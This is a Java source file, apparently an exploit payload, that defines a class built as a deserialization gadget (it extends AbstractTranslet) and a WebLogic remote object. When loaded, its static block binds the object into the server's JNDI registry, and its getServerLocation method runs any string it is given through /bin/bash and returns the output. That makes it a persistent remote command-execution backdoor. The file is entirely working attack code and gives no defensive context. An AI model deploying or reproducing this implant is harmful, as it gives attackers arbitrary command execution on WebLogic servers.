package com.boogipop.payload;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import weblogic.cluster.singleton.ClusterMasterRemote;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.rmi.RemoteException;
import java.util.ArrayList;
import java.util.List;

public class RemoteImpl extends AbstractTranslet implements ClusterMasterRemote {

    static {
        try{
            Context ctx = new InitialContext();
            ctx.rebind("Boogipop", new RemoteImpl());
        }catch (Exception e){

        }
    }
    public static void main(String[] args) {
    }


    @Override
    public void setServerLocation(String cmd, String args) throws RemoteException {

    }


    @Override
    public String getServerLocation(String cmd) throws RemoteException {
        try {

            List<String> cmds = new ArrayList<String>();

            cmds.add("/bin/bash");
            cmds.add("-c");
            cmds.add(cmd);

            ProcessBuilder processBuilder = new ProcessBuilder(cmds);
            processBuilder.redirectErrorStream(true);
            Process proc = processBuilder.start();

            BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            StringBuffer sb = new StringBuffer();

            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line).append("\n");
            }

            return sb.toString();
        } catch (Exception e) {
            return e.getMessage();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
